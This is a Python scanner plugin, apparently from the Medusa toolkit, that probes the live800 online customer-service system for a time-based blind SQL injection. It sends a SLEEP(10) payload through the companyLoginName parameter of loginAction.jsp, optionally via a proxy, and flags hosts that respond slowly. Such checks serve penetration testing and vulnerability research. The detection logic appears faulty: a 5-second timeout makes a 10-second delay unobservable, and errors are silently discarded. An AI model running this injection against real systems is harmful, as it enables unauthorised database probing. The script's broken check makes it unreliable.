#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: live800在线客服系统loginAction SQL注入漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-0147511
author: Ascotbe
reference: Lucifer
description: 文件/live800/loginAction.jsp中,参数companyLoginName存在时间盲注,导致敏感信息泄露。
'''
import urllib
import requests
import time
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/live800/loginAction.jsp?companyLoginName=1%27Or(SeLeCt%20SlEeP(10))%23&loginName=a&password=a"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp
    payload_url = scheme+"://"+url+payload
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    try:
        #s = requests.session()
        start_time = time.time()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if time.time() - start_time >= 10:
            Medusa = "{} 存在live800在线客服系统SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception as e:
        pass